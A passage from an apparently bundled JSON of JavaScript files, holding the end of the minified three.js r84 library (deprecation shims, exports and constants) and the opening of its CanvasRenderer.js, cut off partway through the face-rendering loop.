.texture.anisotropy.\");this.texture.anisotropy=a}},offset:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");return this.texture.offset},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .offset is now .texture.offset.\");this.texture.offset=a}},repeat:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");return this.texture.repeat},\nset:function(a){console.warn(\"THREE.WebGLRenderTarget: .repeat is now .texture.repeat.\");this.texture.repeat=a}},format:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");return this.texture.format},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .format is now .texture.format.\");this.texture.format=a}},type:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");return this.texture.type},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .type is now .texture.type.\");\nthis.texture.type=a}},generateMipmaps:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");return this.texture.generateMipmaps},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .generateMipmaps is now .texture.generateMipmaps.\");this.texture.generateMipmaps=a}}});hc.prototype.load=function(a){console.warn(\"THREE.Audio: .load has been deprecated. Use THREE.AudioLoader instead.\");var b=this;(new ge).load(a,function(a){b.setBuffer(a)});return this};\nle.prototype.getData=function(){console.warn(\"THREE.AudioAnalyser: .getData() is now .getFrequencyData().\");return this.getFrequencyData()};l.WebGLRenderTargetCube=Gb;l.WebGLRenderTarget=Ya;l.WebGLRenderer=Yd;l.ShaderLib=bb;l.UniformsLib=V;l.UniformsUtils=Ja;l.ShaderChunk=Z;l.FogExp2=Kb;l.Fog=Lb;l.Scene=mb;l.LensFlare=Zd;l.Sprite=Dc;l.LOD=Ec;l.SkinnedMesh=qd;l.Skeleton=od;l.Bone=pd;l.Mesh=Aa;l.LineSegments=ga;l.Line=Ua;l.Points=Mb;l.Group=Fc;l.VideoTexture=rd;l.DataTexture=eb;l.CompressedTexture=\nNb;l.CubeTexture=Za;l.CanvasTexture=sd;l.DepthTexture=Gc;l.Texture=ea;l.CompressedTextureLoader=Re;l.DataTextureLoader=ae;l.CubeTextureLoader=be;l.TextureLoader=td;l.ObjectLoader=Se;l.MaterialLoader=Hd;l.BufferGeometryLoader=ce;l.DefaultLoadingManager=ta;l.LoadingManager=$d;l.JSONLoader=de;l.ImageLoader=Yc;l.FontLoader=Ue;l.FileLoader=sa;l.Loader=zb;l.Cache=ld;l.AudioLoader=ge;l.SpotLightShadow=vd;l.SpotLight=wd;l.PointLight=xd;l.RectAreaLight=he;l.HemisphereLight=ud;l.DirectionalLightShadow=yd;l.DirectionalLight=\nzd;l.AmbientLight=Ad;l.LightShadow=wb;l.Light=ma;l.StereoCamera=Ve;l.PerspectiveCamera=Fa;l.OrthographicCamera=Jb;l.CubeCamera=Id;l.Camera=ra;l.AudioListener=ie;l.PositionalAudio=ke;l.AudioContext=je;l.AudioAnalyser=le;l.Audio=hc;l.VectorKeyframeTrack=dc;l.StringKeyframeTrack=Ed;l.QuaternionKeyframeTrack=$c;l.NumberKeyframeTrack=ec;l.ColorKeyframeTrack=Gd;l.BooleanKeyframeTrack=Fd;l.PropertyMixer=Jd;l.PropertyBinding=ka;l.KeyframeTrack=yb;l.AnimationUtils=na;l.AnimationObjectGroup=me;l.AnimationMixer=\ncd;l.AnimationClip=qa;l.Uniform=Kd;l.InstancedBufferGeometry=Eb;l.BufferGeometry=I;l.GeometryIdCount=function(){return Vd++};l.Geometry=T;l.InterleavedBufferAttribute=oe;l.InstancedInterleavedBuffer=jc;l.InterleavedBuffer=ic;l.InstancedBufferAttribute=kc;l.Face3=ha;l.Object3D=x;l.Raycaster=pe;l.Layers=nd;l.EventDispatcher=pa;l.Clock=re;l.QuaternionLinearInterpolant=Dd;l.LinearInterpolant=Zc;l.DiscreteInterpolant=Cd;l.CubicInterpolant=Bd;l.Interpolant=xa;l.Triangle=za;l.Math=N;l.Spherical=se;l.Cylindrical=\nte;l.Plane=la;l.Frustum=tc;l.Sphere=Na;l.Ray=cb;l.Matrix4=S;l.Matrix3=ya;l.Box3=Pa;l.Box2=sc;l.Line3=hb;l.Euler=db;l.Vector4=fa;l.Vector3=q;l.Vector2=D;l.Quaternion=ca;l.Color=J;l.MorphBlendMesh=oa;l.ImmediateRenderObject=dd;l.VertexNormalsHelper=ed;l.SpotLightHelper=lc;l.SkeletonHelper=mc;l.PointLightHelper=nc;l.RectAreaLightHelper=oc;l.HemisphereLightHelper=pc;l.GridHelper=fd;l.PolarGridHelper=Ld;l.FaceNormalsHelper=gd;l.DirectionalLightHelper=qc;l.CameraHelper=hd;l.BoxHelper=rc;l.ArrowHelper=Fb;\nl.AxisHelper=Nd;l.CatmullRomCurve3=va;l.CubicBezierCurve3=id;l.QuadraticBezierCurve3=jd;l.LineCurve3=kd;l.ArcCurve=Od;l.EllipseCurve=Wa;l.SplineCurve=Cb;l.CubicBezierCurve=fc;l.QuadraticBezierCurve=gc;l.LineCurve=Ta;l.Shape=Db;l.Path=bd;l.ShapePath=ee;l.Font=fe;l.CurvePath=ad;l.Curve=ua;l.ShapeUtils=Ia;l.SceneUtils={createMultiMaterialObject:function(a,b){for(var c=new Fc,d=0,e=b.length;d<e;d++)c.add(new Aa(a,b[d]));return c},detach:function(a,b,c){a.applyMatrix(b.matrixWorld);b.remove(a);c.add(a)},\nattach:function(a,b,c){var d=new S;d.getInverse(c.matrixWorld);a.applyMatrix(d);b.remove(a);c.add(a)}};l.WireframeGeometry=Ob;l.ParametricGeometry=Hc;l.ParametricBufferGeometry=Pb;l.TetrahedronGeometry=Jc;l.TetrahedronBufferGeometry=Qb;l.OctahedronGeometry=Kc;l.OctahedronBufferGeometry=ob;l.IcosahedronGeometry=Lc;l.IcosahedronBufferGeometry=Rb;l.DodecahedronGeometry=Mc;l.DodecahedronBufferGeometry=Sb;l.PolyhedronGeometry=Ic;l.PolyhedronBufferGeometry=Ba;l.TubeGeometry=Nc;l.TubeBufferGeometry=Tb;l.TorusKnotGeometry=\nOc;l.TorusKnotBufferGeometry=Ub;l.TorusGeometry=Pc;l.TorusBufferGeometry=Vb;l.TextGeometry=Qc;l.SphereGeometry=Rc;l.SphereBufferGeometry=pb;l.RingGeometry=Sc;l.RingBufferGeometry=Wb;l.PlaneGeometry=Ac;l.PlaneBufferGeometry=lb;l.LatheGeometry=Tc;l.LatheBufferGeometry=Xb;l.ShapeGeometry=Yb;l.ShapeBufferGeometry=Zb;l.ExtrudeGeometry=La;l.EdgesGeometry=$b;l.ConeGeometry=Uc;l.ConeBufferGeometry=Vc;l.CylinderGeometry=qb;l.CylinderBufferGeometry=Va;l.CircleGeometry=Wc;l.CircleBufferGeometry=ac;l.BoxGeometry=\nIb;l.BoxBufferGeometry=kb;l.ShadowMaterial=bc;l.SpriteMaterial=nb;l.RawShaderMaterial=cc;l.ShaderMaterial=Ha;l.PointsMaterial=Oa;l.MultiMaterial=Xc;l.MeshPhysicalMaterial=rb;l.MeshStandardMaterial=Qa;l.MeshPhongMaterial=Ca;l.MeshToonMaterial=sb;l.MeshNormalMaterial=tb;l.MeshLambertMaterial=ub;l.MeshDepthMaterial=ab;l.MeshBasicMaterial=Ka;l.LineDashedMaterial=vb;l.LineBasicMaterial=ia;l.Material=X;l.Float64BufferAttribute=zc;l.Float32BufferAttribute=z;l.Uint32BufferAttribute=jb;l.Int32BufferAttribute=\nyc;l.Uint16BufferAttribute=ib;l.Int16BufferAttribute=xc;l.Uint8ClampedBufferAttribute=wc;l.Uint8BufferAttribute=vc;l.Int8BufferAttribute=uc;l.BufferAttribute=U;l.REVISION=\"84\";l.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2};l.CullFaceNone=0;l.CullFaceBack=1;l.CullFaceFront=2;l.CullFaceFrontBack=3;l.FrontFaceDirectionCW=0;l.FrontFaceDirectionCCW=1;l.BasicShadowMap=0;l.PCFShadowMap=1;l.PCFSoftShadowMap=2;l.FrontSide=0;l.BackSide=1;l.DoubleSide=2;l.FlatShading=1;l.SmoothShading=2;l.NoColors=0;l.FaceColors=1;l.VertexColors=\n2;l.NoBlending=0;l.NormalBlending=1;l.AdditiveBlending=2;l.SubtractiveBlending=3;l.MultiplyBlending=4;l.CustomBlending=5;l.AddEquation=100;l.SubtractEquation=101;l.ReverseSubtractEquation=102;l.MinEquation=103;l.MaxEquation=104;l.ZeroFactor=200;l.OneFactor=201;l.SrcColorFactor=202;l.OneMinusSrcColorFactor=203;l.SrcAlphaFactor=204;l.OneMinusSrcAlphaFactor=205;l.DstAlphaFactor=206;l.OneMinusDstAlphaFactor=207;l.DstColorFactor=208;l.OneMinusDstColorFactor=209;l.SrcAlphaSaturateFactor=210;l.NeverDepth=\n0;l.AlwaysDepth=1;l.LessDepth=2;l.LessEqualDepth=3;l.EqualDepth=4;l.GreaterEqualDepth=5;l.GreaterDepth=6;l.NotEqualDepth=7;l.MultiplyOperation=0;l.MixOperation=1;l.AddOperation=2;l.NoToneMapping=0;l.LinearToneMapping=1;l.ReinhardToneMapping=2;l.Uncharted2ToneMapping=3;l.CineonToneMapping=4;l.UVMapping=300;l.CubeReflectionMapping=301;l.CubeRefractionMapping=302;l.EquirectangularReflectionMapping=303;l.EquirectangularRefractionMapping=304;l.SphericalReflectionMapping=305;l.CubeUVReflectionMapping=306;\nl.CubeUVRefractionMapping=307;l.RepeatWrapping=1E3;l.ClampToEdgeWrapping=1001;l.MirroredRepeatWrapping=1002;l.NearestFilter=1003;l.NearestMipMapNearestFilter=1004;l.NearestMipMapLinearFilter=1005;l.LinearFilter=1006;l.LinearMipMapNearestFilter=1007;l.LinearMipMapLinearFilter=1008;l.UnsignedByteType=1009;l.ByteType=1010;l.ShortType=1011;l.UnsignedShortType=1012;l.IntType=1013;l.UnsignedIntType=1014;l.FloatType=1015;l.HalfFloatType=1016;l.UnsignedShort4444Type=1017;l.UnsignedShort5551Type=1018;l.UnsignedShort565Type=\n1019;l.UnsignedInt248Type=1020;l.AlphaFormat=1021;l.RGBFormat=1022;l.RGBAFormat=1023;l.LuminanceFormat=1024;l.LuminanceAlphaFormat=1025;l.RGBEFormat=1023;l.DepthFormat=1026;l.DepthStencilFormat=1027;l.RGB_S3TC_DXT1_Format=2001;l.RGBA_S3TC_DXT1_Format=2002;l.RGBA_S3TC_DXT3_Format=2003;l.RGBA_S3TC_DXT5_Format=2004;l.RGB_PVRTC_4BPPV1_Format=2100;l.RGB_PVRTC_2BPPV1_Format=2101;l.RGBA_PVRTC_4BPPV1_Format=2102;l.RGBA_PVRTC_2BPPV1_Format=2103;l.RGB_ETC1_Format=2151;l.LoopOnce=2200;l.LoopRepeat=2201;l.LoopPingPong=\n2202;l.InterpolateDiscrete=2300;l.InterpolateLinear=2301;l.InterpolateSmooth=2302;l.ZeroCurvatureEnding=2400;l.ZeroSlopeEnding=2401;l.WrapAroundEnding=2402;l.TrianglesDrawMode=0;l.TriangleStripDrawMode=1;l.TriangleFanDrawMode=2;l.LinearEncoding=3E3;l.sRGBEncoding=3001;l.GammaEncoding=3007;l.RGBEEncoding=3002;l.LogLuvEncoding=3003;l.RGBM7Encoding=3004;l.RGBM16Encoding=3005;l.RGBDEncoding=3006;l.BasicDepthPacking=3200;l.RGBADepthPacking=3201;l.CubeGeometry=Ib;l.Face4=function(a,b,c,d,e,f,g){console.warn(\"THREE.Face4 has been removed. A THREE.Face3 will be created instead.\");\nreturn new ha(a,b,c,e,f,g)};l.LineStrip=0;l.LinePieces=1;l.MeshFaceMaterial=function(a){console.warn(\"THREE.MeshFaceMaterial has been renamed to THREE.MultiMaterial.\");return new Xc(a)};l.PointCloud=function(a,b){console.warn(\"THREE.PointCloud has been renamed to THREE.Points.\");return new Mb(a,b)};l.Particle=function(a){console.warn(\"THREE.Particle has been renamed to THREE.Sprite.\");return new Dc(a)};l.ParticleSystem=function(a,b){console.warn(\"THREE.ParticleSystem has been renamed to THREE.Points.\");\nreturn new Mb(a,b)};l.PointCloudMaterial=function(a){console.warn(\"THREE.PointCloudMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.ParticleBasicMaterial=function(a){console.warn(\"THREE.ParticleBasicMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.ParticleSystemMaterial=function(a){console.warn(\"THREE.ParticleSystemMaterial has been renamed to THREE.PointsMaterial.\");return new Oa(a)};l.Vertex=function(a,b,c){console.warn(\"THREE.Vertex has been removed. Use THREE.Vector3 instead.\");\nreturn new q(a,b,c)};l.DynamicBufferAttribute=function(a,b){console.warn(\"THREE.DynamicBufferAttribute has been removed. Use new THREE.BufferAttribute().setDynamic( true ) instead.\");return(new U(a,b)).setDynamic(!0)};l.Int8Attribute=function(a,b){console.warn(\"THREE.Int8Attribute has been removed. Use new THREE.Int8BufferAttribute() instead.\");return new uc(a,b)};l.Uint8Attribute=function(a,b){console.warn(\"THREE.Uint8Attribute has been removed. Use new THREE.Uint8BufferAttribute() instead.\");return new vc(a,\nb)};l.Uint8ClampedAttribute=function(a,b){console.warn(\"THREE.Uint8ClampedAttribute has been removed. Use new THREE.Uint8ClampedBufferAttribute() instead.\");return new wc(a,b)};l.Int16Attribute=function(a,b){console.warn(\"THREE.Int16Attribute has been removed. Use new THREE.Int16BufferAttribute() instead.\");return new xc(a,b)};l.Uint16Attribute=function(a,b){console.warn(\"THREE.Uint16Attribute has been removed. Use new THREE.Uint16BufferAttribute() instead.\");return new ib(a,b)};l.Int32Attribute=\nfunction(a,b){console.warn(\"THREE.Int32Attribute has been removed. Use new THREE.Int32BufferAttribute() instead.\");return new yc(a,b)};l.Uint32Attribute=function(a,b){console.warn(\"THREE.Uint32Attribute has been removed. Use new THREE.Uint32BufferAttribute() instead.\");return new jb(a,b)};l.Float32Attribute=function(a,b){console.warn(\"THREE.Float32Attribute has been removed. Use new THREE.Float32BufferAttribute() instead.\");return new z(a,b)};l.Float64Attribute=function(a,b){console.warn(\"THREE.Float64Attribute has been removed. Use new THREE.Float64BufferAttribute() instead.\");\nreturn new zc(a,b)};l.ClosedSplineCurve3=Xe;l.SplineCurve3=Ye;l.Spline=we;l.BoundingBoxHelper=function(a,b){console.warn(\"THREE.BoundingBoxHelper has been deprecated. Creating a THREE.BoxHelper instead.\");return new rc(a,b)};l.EdgesHelper=function(a,b){console.warn(\"THREE.EdgesHelper has been removed. Use THREE.EdgesGeometry instead.\");return new ga(new $b(a.geometry),new ia({color:void 0!==b?b:16777215}))};l.WireframeHelper=function(a,b){console.warn(\"THREE.WireframeHelper has been removed. Use THREE.WireframeGeometry instead.\");\nreturn new ga(new Ob(a.geometry),new ia({color:void 0!==b?b:16777215}))};l.XHRLoader=function(a){console.warn(\"THREE.XHRLoader has been renamed to THREE.FileLoader.\");return new sa(a)};l.BinaryTextureLoader=function(a){console.warn(\"THREE.BinaryTextureLoader has been renamed to THREE.DataTextureLoader.\");return new ae(a)};l.GeometryUtils={merge:function(a,b,c){console.warn(\"THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.\");\nvar d;b.isMesh&&(b.matrixAutoUpdate&&b.updateMatrix(),d=b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\"THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead.\");return a.center()}};l.ImageUtils={crossOrigin:void 0,loadTexture:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTexture has been deprecated. Use THREE.TextureLoader() instead.\");var e=new td;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},\nloadTextureCube:function(a,b,c,d){console.warn(\"THREE.ImageUtils.loadTextureCube has been deprecated. Use THREE.CubeTextureLoader() instead.\");var e=new be;e.setCrossOrigin(this.crossOrigin);a=e.load(a,c,void 0,d);b&&(a.mapping=b);return a},loadCompressedTexture:function(){console.error(\"THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.\")},loadCompressedTextureCube:function(){console.error(\"THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.\")}};\nl.Projector=function(){console.error(\"THREE.Projector has been moved to /examples/js/renderers/Projector.js.\");this.projectVector=function(a,b){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\");a.project(b)};this.unprojectVector=function(a,b){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\");a.unproject(b)};this.pickingRay=function(){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")}};l.CanvasRenderer=function(){console.error(\"THREE.CanvasRenderer has been moved to /examples/js/renderers/CanvasRenderer.js\");\nthis.domElement=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");this.clear=function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};Object.defineProperty(l,\"__esModule\",{value:!0})});\n"},{"url":"/lib/three/lib/CanvasRenderer.js","content":"/**\n * @author mrdoob / http://mrdoob.com/\n */\n\nTHREE.SpriteCanvasMaterial = function ( parameters ) {\n\n\tTHREE.Material.call( this );\n\n\tthis.type = 'SpriteCanvasMaterial';\n\n\tthis.color = new THREE.Color( 0xffffff );\n\tthis.program = function ( context, color ) {};\n\n\tthis.setValues( parameters );\n\n};\n\nTHREE.SpriteCanvasMaterial.prototype = Object.create( THREE.Material.prototype );\nTHREE.SpriteCanvasMaterial.prototype.constructor = THREE.SpriteCanvasMaterial;\n\nTHREE.SpriteCanvasMaterial.prototype.clone = function () {\n\n\tvar material = new THREE.SpriteCanvasMaterial();\n\n\tmaterial.copy( this );\n\tmaterial.color.copy( this.color );\n\tmaterial.program = this.program;\n\n\treturn material;\n\n};\n\n//\n\nTHREE.CanvasRenderer = function ( parameters ) {\n\n\tconsole.log( 'THREE.CanvasRenderer', THREE.REVISION );\n\n\tparameters = parameters || {};\n\n\tvar _this = this,\n\t_renderData, _elements, _lights,\n\t_projector = new THREE.Projector(),\n\n\t_canvas = parameters.canvas !== undefined\n\t\t\t ? parameters.canvas\n\t\t\t : document.createElement( 'canvas' ),\n\n\t_canvasWidth = _canvas.width,\n\t_canvasHeight = _canvas.height,\n\t_canvasWidthHalf = Math.floor( _canvasWidth / 2 ),\n\t_canvasHeightHalf = Math.floor( _canvasHeight / 2 ),\n\n\t_viewportX = 0,\n\t_viewportY = 0,\n\t_viewportWidth = _canvasWidth,\n\t_viewportHeight = _canvasHeight,\n\n\t_pixelRatio = 1,\n\n\t_context = _canvas.getContext( '2d', {\n\t\talpha: parameters.alpha === true\n\t} ),\n\n\t_clearColor = new THREE.Color( 0x000000 ),\n\t_clearAlpha = parameters.alpha === true ? 0 : 1,\n\n\t_contextGlobalAlpha = 1,\n\t_contextGlobalCompositeOperation = 0,\n\t_contextStrokeStyle = null,\n\t_contextFillStyle = null,\n\t_contextLineWidth = null,\n\t_contextLineCap = null,\n\t_contextLineJoin = null,\n\t_contextLineDash = [],\n\n\t_camera,\n\n\t_v1, _v2, _v3, _v4,\n\t_v5 = new THREE.RenderableVertex(),\n\t_v6 = new THREE.RenderableVertex(),\n\n\t_v1x, _v1y, _v2x, _v2y, _v3x, _v3y,\n\t_v4x, _v4y, _v5x, _v5y, _v6x, _v6y,\n\n\t_color = new THREE.Color(),\n\t_color1 = new THREE.Color(),\n\t_color2 = new THREE.Color(),\n\t_color3 = new THREE.Color(),\n\t_color4 = new THREE.Color(),\n\n\t_diffuseColor = new THREE.Color(),\n\t_emissiveColor = new THREE.Color(),\n\n\t_lightColor = new THREE.Color(),\n\n\t_patterns = {},\n\n\t_image, _uvs,\n\t_uv1x, _uv1y, _uv2x, _uv2y, _uv3x, _uv3y,\n\n\t_clipBox = new THREE.Box2(),\n\t_clearBox = new THREE.Box2(),\n\t_elemBox = new THREE.Box2(),\n\n\t_ambientLight = new THREE.Color(),\n\t_directionalLights = new THREE.Color(),\n\t_pointLights = new THREE.Color(),\n\n\t_vector3 = new THREE.Vector3(), // Needed for PointLight\n\t_centroid = new THREE.Vector3(),\n\t_normal = new THREE.Vector3(),\n\t_normalViewMatrix = new THREE.Matrix3();\n\n\t/* TODO\n\t_canvas.mozImageSmoothingEnabled = false;\n\t_canvas.webkitImageSmoothingEnabled = false;\n\t_canvas.msImageSmoothingEnabled = false;\n\t_canvas.imageSmoothingEnabled = false;\n\t*/\n\n\t// dash+gap fallbacks for Firefox and everything else\n\n\tif ( _context.setLineDash === undefined ) {\n\n\t\t_context.setLineDash = function () {};\n\n\t}\n\n\tthis.domElement = _canvas;\n\n\tthis.autoClear = true;\n\tthis.sortObjects = true;\n\tthis.sortElements = true;\n\n\tthis.info = {\n\n\t\trender: {\n\n\t\t\tvertices: 0,\n\t\t\tfaces: 0\n\n\t\t}\n\n\t};\n\n\t// WebGLRenderer compatibility\n\n\tthis.supportsVertexTextures = function () {};\n\tthis.setFaceCulling = function () {};\n\n\t// API\n\n\tthis.getContext = function () {\n\n\t\treturn _context;\n\n\t};\n\n\tthis.getContextAttributes = function () {\n\n\t\treturn _context.getContextAttributes();\n\n\t};\n\n\tthis.getPixelRatio = function () {\n\n\t\treturn _pixelRatio;\n\n\t};\n\n\tthis.setPixelRatio = function ( value ) {\n\n\t\tif ( value !== undefined ) _pixelRatio = value;\n\n\t};\n\n\tthis.setSize = function ( width, height, updateStyle ) {\n\n\t\t_canvasWidth = width * _pixelRatio;\n\t\t_canvasHeight = height * _pixelRatio;\n\n\t\t_canvas.width = _canvasWidth;\n\t\t_canvas.height = _canvasHeight;\n\n\t\t_canvasWidthHalf = Math.floor( _canvasWidth / 2 );\n\t\t_canvasHeightHalf = Math.floor( _canvasHeight / 2 );\n\n\t\tif ( updateStyle !== false ) {\n\n\t\t\t_canvas.style.width = width + 'px';\n\t\t\t_canvas.style.height = height + 'px';\n\n\t\t}\n\n\t\t_clipBox.min.set( - _canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clipBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t\t_clearBox.min.set( - _canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clearBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t\t_contextGlobalAlpha = 1;\n\t\t_contextGlobalCompositeOperation = 0;\n\t\t_contextStrokeStyle = null;\n\t\t_contextFillStyle = null;\n\t\t_contextLineWidth = null;\n\t\t_contextLineCap = null;\n\t\t_contextLineJoin = null;\n\n\t\tthis.setViewport( 0, 0, width, height );\n\n\t};\n\n\tthis.setViewport = function ( x, y, width, height ) {\n\n\t\t_viewportX = x * _pixelRatio;\n\t\t_viewportY = y * _pixelRatio;\n\n\t\t_viewportWidth = width * _pixelRatio;\n\t\t_viewportHeight = height * _pixelRatio;\n\n\t};\n\n\tthis.setScissor = function () {};\n\tthis.setScissorTest = function () {};\n\n\tthis.setClearColor = function ( color, alpha ) {\n\n\t\t_clearColor.set( color );\n\t\t_clearAlpha = alpha !== undefined ? alpha : 1;\n\n\t\t_clearBox.min.set( - _canvasWidthHalf, - _canvasHeightHalf );\n\t\t_clearBox.max.set(   _canvasWidthHalf,   _canvasHeightHalf );\n\n\t};\n\n\tthis.setClearColorHex = function ( hex, alpha ) {\n\n\t\tconsole.warn( 'THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.' );\n\t\tthis.setClearColor( hex, alpha );\n\n\t};\n\n\tthis.getClearColor = function () {\n\n\t\treturn _clearColor;\n\n\t};\n\n\tthis.getClearAlpha = function () {\n\n\t\treturn _clearAlpha;\n\n\t};\n\n\tthis.getMaxAnisotropy = function () {\n\n\t\treturn 0;\n\n\t};\n\n\tthis.clear = function () {\n\n\t\tif ( _clearBox.isEmpty() === false ) {\n\n\t\t\t_clearBox.intersect( _clipBox );\n\t\t\t_clearBox.expandByScalar( 2 );\n\n\t\t\t_clearBox.min.x = _clearBox.min.x + _canvasWidthHalf;\n\t\t\t_clearBox.min.y =  - _clearBox.min.y + _canvasHeightHalf;\t\t// higher y value !\n\t\t\t_clearBox.max.x = _clearBox.max.x + _canvasWidthHalf;\n\t\t\t_clearBox.max.y =  - _clearBox.max.y + _canvasHeightHalf;\t\t// lower y value !\n\n\t\t\tif ( _clearAlpha < 1 ) {\n\n\t\t\t\t_context.clearRect(\n\t\t\t\t\t_clearBox.min.x | 0,\n\t\t\t\t\t_clearBox.max.y | 0,\n\t\t\t\t\t( _clearBox.max.x - _clearBox.min.x ) | 0,\n\t\t\t\t\t( _clearBox.min.y - _clearBox.max.y ) | 0\n\t\t\t\t);\n\n\t\t\t}\n\n\t\t\tif ( _clearAlpha > 0 ) {\n\n\t\t\t\tsetBlending( THREE.NormalBlending );\n\t\t\t\tsetOpacity( 1 );\n\n\t\t\t\tsetFillStyle( 'rgba(' + Math.floor( _clearColor.r * 255 ) + ',' + Math.floor( _clearColor.g * 255 ) + ',' + Math.floor( _clearColor.b * 255 ) + ',' + _clearAlpha + ')' );\n\n\t\t\t\t_context.fillRect(\n\t\t\t\t\t_clearBox.min.x | 0,\n\t\t\t\t\t_clearBox.max.y | 0,\n\t\t\t\t\t( _clearBox.max.x - _clearBox.min.x ) | 0,\n\t\t\t\t\t( _clearBox.min.y - _clearBox.max.y ) | 0\n\t\t\t\t);\n\n\t\t\t}\n\n\t\t\t_clearBox.makeEmpty();\n\n\t\t}\n\n\t};\n\n\t// compatibility\n\n\tthis.clearColor = function () {};\n\tthis.clearDepth = function () {};\n\tthis.clearStencil = function () {};\n\n\tthis.render = function ( scene, camera ) {\n\n\t\tif ( camera instanceof THREE.Camera === false ) {\n\n\t\t\tconsole.error( 'THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.' );\n\t\t\treturn;\n\n\t\t}\n\n\t\tvar background = scene.background;\n\n\t\tif ( background && background.isColor ) {\n\n\t\t\tsetFillStyle( 'rgb(' + Math.floor( background.r * 255 ) + ',' + Math.floor( background.g * 255 ) + ',' + Math.floor( background.b * 255 ) + ')' );\n\t\t\t_context.fillRect( 0, 0, _canvasWidth, _canvasHeight );\n\n\t\t} else if ( this.autoClear === true ) {\n\n\t\t\tthis.clear();\n\n\t\t}\n\n\t\t_this.info.render.vertices = 0;\n\t\t_this.info.render.faces = 0;\n\n\t\t_context.setTransform( _viewportWidth / _canvasWidth, 0, 0, - _viewportHeight / _canvasHeight, _viewportX, _canvasHeight - _viewportY );\n\t\t_context.translate( _canvasWidthHalf, _canvasHeightHalf );\n\n\t\t_renderData = _projector.projectScene( scene, camera, this.sortObjects, this.sortElements );\n\t\t_elements = _renderData.elements;\n\t\t_lights = _renderData.lights;\n\t\t_camera = camera;\n\n\t\t_normalViewMatrix.getNormalMatrix( camera.matrixWorldInverse );\n\n\t\t/* DEBUG\n\t\tsetFillStyle( 'rgba( 0, 255, 255, 0.5 )' );\n\t\t_context.fillRect( _clipBox.min.x, _clipBox.min.y, _clipBox.max.x - _clipBox.min.x, _clipBox.max.y - _clipBox.min.y );\n\t\t*/\n\n\t\tcalculateLights();\n\n\t\tfor ( var e = 0, el = _elements.length; e < el; e ++ ) {\n\n\t\t\tvar element = _elements[ e ];\n\n\t\t\tvar material = element.material;\n\n\t\t\tif ( material === undefined || material.opacity === 0 ) continue;\n\n\t\t\t_elemBox.makeEmpty();\n\n\t\t\tif ( element instanceof THREE.RenderableSprite ) {\n\n\t\t\t\t_v1 = element;\n\t\t\t\t_v1.x *= _canvasWidthHalf; _v1.y *= _canvasHeightHalf;\n\n\t\t\t\trenderSprite( _v1, element, material );\n\n\t\t\t} else if ( element instanceof THREE.RenderableLine ) {\n\n\t\t\t\t_v1 = element.v1; _v2 = element.v2;\n\n\t\t\t\t_v1.positionScreen.x *= _canvasWidthHalf; _v1.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v2.positionScreen.x *= _canvasWidthHalf; _v2.positionScreen.y *= _canvasHeightHalf;\n\n\t\t\t\t_elemBox.setFromPoints( [\n\t\t\t\t\t_v1.positionScreen,\n\t\t\t\t\t_v2.positionScreen\n\t\t\t\t] );\n\n\t\t\t\tif ( _clipBox.intersectsBox( _elemBox ) === true ) {\n\n\t\t\t\t\trenderLine( _v1, _v2, element, material );\n\n\t\t\t\t}\n\n\t\t\t} else if ( element instanceof THREE.RenderableFace ) {\n\n\t\t\t\t_v1 = element.v1; _v2 = element.v2; _v3 = element.v3;\n\n\t\t\t\tif ( _v1.positionScreen.z < - 1 || _v1.positionScreen.z > 1 ) continue;\n\t\t\t\tif ( _v2.positionScreen.z < - 1 || _v2.positionScreen.z > 1 ) continue;\n\t\t\t\tif ( _v3.positionScreen.z < - 1 || _v3.positionScreen.z > 1 ) continue;\n\n\t\t\t\t_v1.positionScreen.x *= _canvasWidthHalf; _v1.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v2.positionScreen.x *= _canvasWidthHalf; _v2.positionScreen.y *= _canvasHeightHalf;\n\t\t\t\t_v3.positionScreen.x *= _canvasWidthHalf; _v3.positionScreen.y *= _canvasHeightHalf;\n\n\t\t\t\tif ( material.overdraw > 0 ) {\n\n\t\t\t\t\texpand( _v1.positionScreen, _v2.positionScreen, material.overdraw );\n\t\t\t\t\texpand( _v2.positionScreen, _v3.positionScreen, material.overdraw );\n\t\t\t\t\texpand( _v3.positionScreen, _v1.positionScreen, material.overdraw );\n\n\t\t\t\t}\n\n\t\t\t\t_elemBox.setFromPoints( [\n\t\t\t\t\t_v1.positionScreen,\n\t\t\t\t\t_v2.positionScreen,\n\t\t\t\t\t_v3.positionScreen\n\t\t\t\t] );\n\n\t\t\t\tif ( _clipBox.intersectsBox( _elemBox ) === true ) {\n\n\t\t\t\t\trenderFace3( _v1, _v2, _v3, 0, 1, 2, element, material 